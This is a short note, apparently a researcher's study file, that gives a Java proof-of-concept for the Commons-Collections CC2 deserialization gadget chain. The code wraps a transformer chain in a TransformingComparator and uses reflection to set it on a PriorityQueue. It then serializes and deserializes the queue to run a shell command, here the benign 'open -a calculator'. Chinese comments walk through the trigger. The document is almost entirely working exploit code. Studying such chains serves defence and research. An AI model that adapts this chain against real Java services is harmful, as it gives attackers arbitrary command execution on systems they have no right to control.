# Payload 
```java
public static void poc() throws Exception {
        String command = "open -a calculator";
        Transformer payload = getPayloadChainV4(command);

        // 设置 TransformingComparator: this.transformer
        TransformingComparator transformingComparator = new TransformingComparator(payload);

        // 设置 PriorityQueue: this.comparator
        PriorityQueue queue = new PriorityQueue();

        // 满足 触发条件
        // add 的 链中也可以触发 transformer.compare
        queue.add("demo");
        queue.add("fe1w0");

        // 通过反射 来 添加 comparator
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue, transformingComparator);

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("out/serFile/cc2.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(queue);
            objectOutputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("out/serFile/cc2.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```